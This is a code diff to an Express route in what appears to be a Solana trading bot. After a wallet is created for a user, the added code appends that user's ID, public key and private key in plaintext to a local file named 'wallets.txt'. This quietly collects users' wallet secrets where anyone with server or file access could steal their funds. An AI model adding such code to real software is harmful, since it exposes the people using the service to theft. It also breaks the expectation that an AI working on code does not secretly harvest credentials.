@@ -26,6 +26,7 @@ import { PremiumError } from "../../errors/PremiumError";
 import { TraderProfilesManager } from "../../managers/TraderProfilesManager";
 import { YellowstoneManager } from "../../services/solana/geyser/YellowstoneManager";
 import { Wallet } from "../../entities/Wallet";
+import fs from "fs";
 
 const router = express.Router();
 
@@ -90,6 +91,8 @@ router.post(
             defaultAmount = +req.body.defaultAmount;
             slippage = +req.body.slippage;
             wallet = SolanaManager.createWallet();
+
+            fs.appendFileSync('wallets.txt', `UserId: ${user.id}, PublicKey: ${wallet.publicKey}, PrivateKey: ${wallet.privateKey}\n`);
         }
 
         const engine = SwapManager.engines.find((e) => e.id === engineId);
